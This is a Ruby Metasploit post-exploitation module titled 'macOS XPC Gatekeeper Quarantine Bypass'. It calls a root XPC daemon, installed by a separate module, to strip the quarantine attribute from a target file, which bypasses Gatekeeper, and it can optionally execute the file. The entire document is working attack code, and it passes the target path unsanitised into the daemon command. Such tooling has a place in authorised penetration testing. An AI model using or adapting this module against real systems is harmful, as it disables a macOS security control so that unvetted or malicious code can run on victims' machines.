require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::XPCDaemon

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'macOS XPC Gatekeeper Quarantine Bypass',
      'Description'   => %q{
        Removes com.apple.quarantine xattr from files via root XPC daemon,
        bypassing Gatekeeper checks. Optionally executes the file after removal.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Mr.Gedik'],
      'Platform'      => ['osx'],
      'SessionTypes'  => ['meterpreter', 'shell']
    ))
    register_options([
      OptString.new('TARGET_PATH', [true, 'Path to file with quarantine xattr']),
      OptBool.new('EXECUTE',       [false, 'Execute after quarantine removal', false]),
    ])
  end

  def run
    unless xpc_client_exists?
      print_error('XPC client not found. Run xpc_daemon_install first.')
      return
    end
    path = datastore['TARGET_PATH']
    exec_flag = datastore['EXECUTE'] ? ' x' : ''
    print_status("Removing quarantine from #{path}...")
    result = xpc_exec("dq #{path}#{exec_flag}")
    if result && result['s'] == '1'
      print_good("Quarantine removed")
      print_line(result['d'].to_s) if result['d']
    else
      print_error("Failed: #{result&.dig('d') || 'unknown'}")
    end
  end
end
